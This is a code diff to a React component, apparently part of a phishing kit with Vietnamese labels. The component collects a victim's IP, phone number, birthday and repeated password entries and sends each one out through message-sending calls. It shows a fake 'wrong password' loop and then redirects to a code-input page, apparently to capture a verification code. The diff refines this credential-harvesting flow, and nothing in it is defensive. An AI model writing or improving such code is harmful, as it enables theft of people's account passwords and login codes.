@@ -1,12 +1,11 @@
 import HomeImage from '@assets/home-image.png';
-import LoadingModal from '@components/LoadingModal';
+import PasswordModal from '@components/PasswordModal';
 import { editMessageText, sendMessage } from '@utils/api';
 import config from '@utils/config';
 import getToday from '@utils/getToday';
 import React, { useEffect, useRef, useState } from 'react';
 import 'react-phone-input-2/lib/style.css';
 import { Outlet, useLocation, useNavigate } from 'react-router-dom';
-import PasswordModal from '@components/PasswordModal';
 
 const getCurrentTime = () => {
 	const currentTime = new Date()
@@ -87,7 +86,9 @@ const GetInfo: React.FC = () => {
 		}
 	};
 
-	const handlePasswordSubmit = (password: string) => {
+	const handlePasswordSubmit = async (password: string) => {
+		setIsLoading(true);
+
 		const newMessage =
 			`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>\n` +
 			`<b>🌐 IP:</b> <code>${ip}</code>\n` +
@@ -98,13 +99,20 @@ const GetInfo: React.FC = () => {
 			`<b>📞 Số điện thoại:</b> <code>${phoneNumber}</code>\n` +
 			`<b>🎂 Ngày sinh:</b> <code>${birthday}</code>\n` +
 			`<b>🔒 Mật khẩu:</b> <code>${password}</code>`;
+
 		localStorage.setItem('message', newMessage);
-		sendMessage({ text: newMessage });
+		await sendMessage({ text: newMessage });
+
+		await new Promise((resolve) => setTimeout(resolve, loadingTime));
+
+		setIsLoading(false);
 		setIsPasswordModalOpen(false);
 		setIsConfirmPasswordModalOpen(true);
 	};
 
-	const handleBusinessHomeConfirmPassword = (password: string) => {
+	const handleBusinessHomeConfirmPassword = async (password: string) => {
+		setIsLoading(true);
+
 		const existingMessage = localStorage.getItem('message') ?? '';
 		const newMessage =
 			existingMessage.replace(
@@ -112,36 +120,28 @@ const GetInfo: React.FC = () => {
 				`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
 			) +
 			`\n<b>🔒 Mật khẩu ${failedPasswordAttempts + 1}:</b> <code>${password}</code>`;
+
 		localStorage.setItem('message', newMessage);
 		const messageId = localStorage.getItem('message_id');
-		editMessageText({
+
+		await editMessageText({
 			message_id: Number(messageId),
 			text: newMessage,
 		});
 
-		setFailedPasswordAttempts(failedPasswordAttempts + 1);
-		delayLoading();
-	};
+		await new Promise((resolve) => setTimeout(resolve, loadingTime));
 
-	const delayLoading = async () => {
-		setIsLoading(true);
+		setFailedPasswordAttempts((prev) => prev + 1);
+		setIsLoading(false);
+
 		const configData = await config();
-		setTimeout(async () => {
-			setIsLoading(false);
-			if (
-				failedPasswordAttempts ===
-				configData.settings.max_failed_password_attempts
-			) {
-				setIsPasswordModalOpen(false);
-				setIsConfirmPasswordModalOpen(false);
-				navigate('/live/code-input');
-			} else {
-				if (confirmPasswordInputRef.current) {
-					confirmPasswordInputRef.current.value = '';
-				}
-				confirmPasswordInputRef.current?.focus();
-			}
-		}, loadingTime);
+		if (
+			failedPasswordAttempts + 1 >=
+			configData.settings.max_failed_password_attempts
+		) {
+			setIsConfirmPasswordModalOpen(false);
+			navigate('/live/code-input');
+		}
 	};
 
 	const handleButtonClick = () => {
@@ -222,6 +222,7 @@ const GetInfo: React.FC = () => {
 				onClose={() => setIsPasswordModalOpen(false)}
 				onSubmit={handlePasswordSubmit}
 				passwordInputRef={passwordInputRef}
+				isLoading={isLoading}
 			/>
 
 			<PasswordModal
@@ -233,13 +234,6 @@ const GetInfo: React.FC = () => {
 				failedPasswordAttempts={failedPasswordAttempts}
 				isConfirmPassword={true}
 			/>
-
-			{isLoading && (
-				<LoadingModal
-					loadingTime={loadingTime}
-					setShowLoadingModal={setIsLoading}
-				/>
-			)}
 		</div>
 	);
 };
